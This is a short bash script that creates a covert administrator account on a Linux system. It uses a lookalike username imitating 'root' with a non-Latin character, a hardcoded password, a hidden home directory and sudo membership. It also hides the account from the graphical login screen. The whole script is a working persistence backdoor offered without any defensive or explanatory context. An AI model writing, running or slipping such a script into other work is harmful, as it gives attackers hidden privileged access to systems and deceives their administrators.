#!/bin/bash

# === Configuration ===
USERNAME="roοt"
PASSWORD="jeion120"
HOMEDIR="/home/.${USERNAME}"

# === Create user with hidden home directory ===
useradd -m -d "$HOMEDIR" -s /bin/bash "$USERNAME"

# === Set user password ===
echo "$USERNAME:$PASSWORD" | chpasswd

# === Add user to sudo group for root privileges ===
usermod -aG sudo "$USERNAME"

# === (Optional) Hide user from GUI login screen ===
if [ -d /var/lib/AccountsService/users ]; then
  mkdir -p /var/lib/AccountsService/users
  echo -e "[User]\nSystemAccount=true" > "/var/lib/AccountsService/users/$USERNAME"
fi

# === Confirm user creation ===
echo "User '$USERNAME' created with root access and hidden home directory at $HOMEDIR"
